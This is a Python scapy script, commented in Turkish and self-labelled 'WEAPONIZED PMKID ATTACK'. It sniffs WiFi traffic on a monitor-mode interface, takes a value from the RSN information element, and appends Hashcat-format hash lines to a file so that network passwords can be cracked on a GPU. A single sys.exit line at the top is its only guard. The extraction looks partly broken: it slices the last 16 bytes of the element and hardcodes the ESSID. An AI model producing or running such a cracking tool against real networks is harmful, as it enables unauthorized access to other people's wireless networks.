import sys
from scapy.all import *

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod WiFi RSN/PMKID verilerini yakalar.")

print("--- WEAPONIZED PMKID ATTACK ---")

def packet_handler(pkt):
    # EAPOL (Extensible Authentication Protocol over LAN) paketlerini filtrele
    if pkt.haslayer(Dot11Elt) and pkt.ID == 48: # RSN Information Element
        # 1. PMKID ÇIKARTMA (Weaponized Part)
        # Simülasyon: print(pkt.summary())
        # Gerçek: Hashcat'in kırabileceği formatı ayıkla.
        
        try:
            # PMKID verisi genelde payload'ın sonundadır
            load = pkt[Dot11Elt].info
            pmkid = load.hex()[-32:] # Son 16 byte (32 hex karakter)
            
            if pmkid:
                print(f"[+] PMKID Yakalandı: {pmkid}")
                
                # 2. HASHCAT FORMATI (Kırma işlemi için)
                # Format: PMKID*MAC_AP*MAC_STATION*ESSID
                ap_mac = pkt.addr2.replace(":", "")
                client_mac = pkt.addr1.replace(":", "")
                essid = "TargetNetwork" # (Kodla alınabilir)
                
                hash_line = f"{pmkid}*{ap_mac}*{client_mac}*{essid.encode().hex()}"
                
                with open("crack_me.16800", "a") as f:
                    f.write(hash_line + "\n")
                    
                print("💀 HASH KAYDEDİLDİ. GPU ile kırmaya hazır.")
                
        except Exception as e:
            pass

if __name__ == "__main__":
    print("[*] Dinleniyor...")
    sniff(iface="wlan0mon", prn=packet_handler)